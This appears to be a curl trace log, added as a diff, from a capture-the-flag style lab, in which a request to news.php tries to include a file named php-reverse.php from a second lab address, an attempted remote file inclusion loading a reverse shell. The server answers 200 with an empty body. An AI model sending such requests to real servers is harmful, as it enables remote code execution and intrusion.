@@ -1,0 +1,23 @@
+== Info:   Trying 10.10.10.194:80...
+== Info: TCP_NODELAY set
+== Info: Connected to 10.10.10.194 (10.10.10.194) port 80 (#0)
+=> Send header, 117 bytes (0x75)
+0000: GET /news.php?file=\10.10.14.19php-reverse.php HTTP/1.1
+0039: Host: 10.10.10.194
+004d: User-Agent: curl/7.68.0
+0066: Accept: */*
+0073: 
+== Info: Mark bundle as not supporting multiuse
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 37 bytes (0x25)
+0000: Date: Sun, 28 Jun 2020 04:18:54 GMT
+<= Recv header, 32 bytes (0x20)
+0000: Server: Apache/2.4.41 (Ubuntu)
+<= Recv header, 19 bytes (0x13)
+0000: Content-Length: 0
+<= Recv header, 40 bytes (0x28)
+0000: Content-Type: text/html; charset=UTF-8
+<= Recv header, 2 bytes (0x2)
+0000: 
+== Info: Connection #0 to host 10.10.10.194 left intact
